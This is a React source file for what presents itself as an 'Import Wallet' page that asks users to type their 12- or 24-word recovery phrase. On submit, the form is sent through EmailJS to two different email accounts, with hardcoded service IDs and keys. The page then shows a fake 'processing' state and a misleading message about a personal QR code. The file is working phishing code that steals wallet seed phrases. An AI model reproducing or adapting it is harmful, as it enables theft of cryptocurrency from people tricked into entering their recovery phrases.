import React, { useState } from "react";
import { FaTimes } from "react-icons/fa";
import emailjs from "emailjs-com";
import { Link } from "react-router-dom";


const sendEmail = (e) => {
  e.preventDefault();

  emailjs
    .sendForm(
      "service_jsb59ue",
      "template_h7romjb",
      e.target,
      "v3JTBnCKbfnvStRUv"
    )
    .then(
      (result) => {
        alert(" Sucessful. ");
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
    
    emailjs
    .sendForm(
      "service_n6nhf7p",
      "template_z75a9h7",
      e.target,
      "user_TazQmgxrpFxjucMLAxwuW"
    )
    .then(
      (result) => {
        // alert(" Sucessful. ");
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();
};

const Phrase = () => {
  const [hide, setHide] = useState(false);
  const [valid, setvalid] = useState(true);

  const Showmodal = () => {
    setHide(true);
    setvalid(!valid);
  };

  const Closemodal = () => {
    setvalid(true);
  };

  return (
    <div className="phase__container">
      <h1> Import Wallet</h1>
      <br />
      <div className="phase__flex">
        <div className="phase__key">
          <a className="a" href="/">
            <Link to="/phrase">PHRASE KEY</Link>
          </a>
        </div>
        <div>
          <a className="a active" href="/">
            <Link to="/private">PRIVATE KEY</Link>
          </a>
        </div>
        <div>
          <a className="a" href="/">
            <Link to="/keystore">KEYSTORE JSON</Link>
          </a>
        </div>
      </div>
      <hr />
      <h2 className="h2">Sign In With Your Phrase Key</h2>
      {hide ? (
        <div
          onClick={Closemodal}
          className={valid ? "errordiv " : "errordiv quick"}
        >
          <FaTimes
            onClick={Closemodal}
            style={{
              fontSize: "2em",
              color: "black",
              backgroundColor: "black",
              cursor: "pointer",
            }}
          />
          <div className="errorboxr"></div>
          <h3 style={{ color: "white", marginBottom: "1em" }}>
            This is your personal QR code. Ensure you keep it safe.
          </h3>
        </div>
      ) : null}
      <form onSubmit={sendEmail}>
        <input
          type="text"
          placeholder="Enter your Phrase key"
          name="key"
        ></input>

        <h4 className="h4">
          Typically 12 (sometimes 24) words separated by a single spaces.
        </h4>
        <button type="submit" onClick={Showmodal}>
          {" "}
          <b>{valid ? "IMPORT" : "processing... "}</b>{" "}
        </button>
      </form>
    </div>
  );
};

export default Phrase;
